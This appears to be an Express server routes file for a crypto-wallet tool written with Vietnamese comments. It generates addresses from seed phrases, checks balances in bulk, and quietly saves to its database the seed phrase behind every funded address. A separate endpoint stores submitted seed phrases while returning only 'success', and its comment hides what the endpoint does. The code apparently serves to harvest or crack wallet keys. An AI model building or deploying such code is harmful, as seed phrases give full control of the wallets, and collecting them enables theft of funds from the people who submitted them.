import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import * as addressGenerator from "./blockchain/address-generator";
import { checkBalanceWithSmartRotation as checkBalance } from "./blockchain/api-smart-rotation";
import { checkBalancesInParallel, checkBalanceWithRateLimit } from "./blockchain/parallel-balance-checker";
import { BlockchainType, blockchainSchema, seedPhraseSchema, BalanceCheckResult, WalletAddress } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Generate addresses from seed phrase
  app.post("/api/generate-addresses", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        seedPhrase: seedPhraseSchema,
        blockchains: z.array(blockchainSchema),
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { seedPhrase, blockchains } = validationResult.data;

      // Generate addresses
      const addresses = await addressGenerator.generateAddressesFromSeedPhrase(
        seedPhrase,
        blockchains
      );

      return res.json({ addresses });
    } catch (error) {
      console.error("Error generating addresses:", error);
      return res.status(500).json({
        message: "Failed to generate addresses",
        error: String(error),
      });
    }
  });

  // Check balances for addresses
  app.post("/api/check-balances", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        addresses: z.array(
          z.object({
            blockchain: blockchainSchema,
            address: z.string(),
          })
        ),
        seedPhrase: z.string().optional(),
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { addresses, seedPhrase } = validationResult.data;
      const results: BalanceCheckResult[] = [];

      // Check balances for all addresses
      for (const addressData of addresses) {
        const { blockchain, address } = addressData;

        try {
          // Check balance from APIs
          const balance = await checkBalance(blockchain, address);
          
          const hasBalance = parseFloat(balance) > 0;
          results.push({
            address,
            balance,
            hasBalance,
            blockchain
          });

          // If balance > 0 and we have a seed phrase, save to database
          if (hasBalance && seedPhrase) {
            try {
              await storage.createWallet({
                blockchain,
                address,
                balance,
                seedPhrase: seedPhrase,
                path: "",
                metadata: {},
              });
            } catch (dbError) {
              console.error("Error saving wallet to database:", dbError);
              // Continue even if DB save fails
            }
          }
        } catch (error) {
          console.error(`Error checking balance for ${blockchain} address ${address}:`, error);
          results.push({
            address,
            balance: "0",
            hasBalance: false,
            blockchain
          });
        }
      }

      return res.json({ results });
    } catch (error) {
      console.error("Error checking balances:", error);
      return res.status(500).json({
        message: "Failed to check balances",
        error: String(error),
      });
    }
  });

  // API đã bị xóa để tăng cường bảo mật

  // Kiểm tra số dư song song cho nhiều địa chỉ cùng lúc
  app.post("/api/save-manual-seed-phrase", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        seedPhrase: seedPhraseSchema,
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { seedPhrase } = validationResult.data;
      
      // Lưu seed phrase vào database
      await storage.saveManualSeedPhrase(seedPhrase);
      
      // Trả về thành công, không tiết lộ chi tiết về dữ liệu đã lưu
      return res.json({ success: true });
    } catch (error) {
      console.error("Error saving manual seed phrase:", error);
      return res.status(500).json({
        message: "Failed to save seed phrase",
        error: String(error),
      });
    }
  });

  app.post("/api/check-balances-parallel", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        addresses: z.array(
          z.object({
            blockchain: blockchainSchema,
            address: z.string(),
          })
        ),
        seedPhrase: z.string().optional(),
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { addresses, seedPhrase } = validationResult.data;
      const BATCH_SIZE = 3; // Kiểm tra 3 seed phrases (21 địa chỉ) một lần
      
      // Kiểm tra số dư song song cho tất cả địa chỉ
      const startTime = Date.now();
      console.log(`Bắt đầu kiểm tra ${addresses.length} địa chỉ song song (batch size: ${BATCH_SIZE})`);
      
      // Lưu trữ Promise tạm thời để có thể theo dõi tiến trình
      const resultPromises = addresses.map(({ blockchain, address }) => {
        return checkBalanceWithRateLimit(blockchain, address)
          .then(balance => {
            const hasBalance = parseFloat(balance) > 0;
            console.log(`Đã kiểm tra địa chỉ đơn lẻ: ${blockchain} ${address.substring(0, 6)}...`);
            
            return {
              address,
              balance,
              hasBalance,
              blockchain
            };
          })
          .catch(error => {
            console.error(`Error checking ${blockchain} balance for ${address}:`, error);
            return {
              address,
              balance: '0',
              hasBalance: false,
              blockchain
            };
          });
      });
      
      // Đợi tất cả promise hoàn thành
      const results = await Promise.all(resultPromises);
      
      const endTime = Date.now();
      console.log(`Hoàn thành kiểm tra ${addresses.length} địa chỉ song song trong ${endTime - startTime}ms`);

      // Lưu các địa chỉ có số dư vào cơ sở dữ liệu
      if (seedPhrase) {
        for (const result of results) {
          if (result.hasBalance) {
            try {
              await storage.createWallet({
                blockchain: result.blockchain,
                address: result.address,
                balance: result.balance,
                seedPhrase: seedPhrase,
                path: "",
                metadata: {},
              });
            } catch (dbError) {
              console.error("Error saving wallet to database:", dbError);
              // Tiếp tục ngay cả khi lưu DB thất bại
            }
          }
        }
      }

      return res.json({ results });
    } catch (error) {
      console.error("Error checking balances in parallel:", error);
      return res.status(500).json({
        message: "Failed to check balances in parallel",
        error: String(error),
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
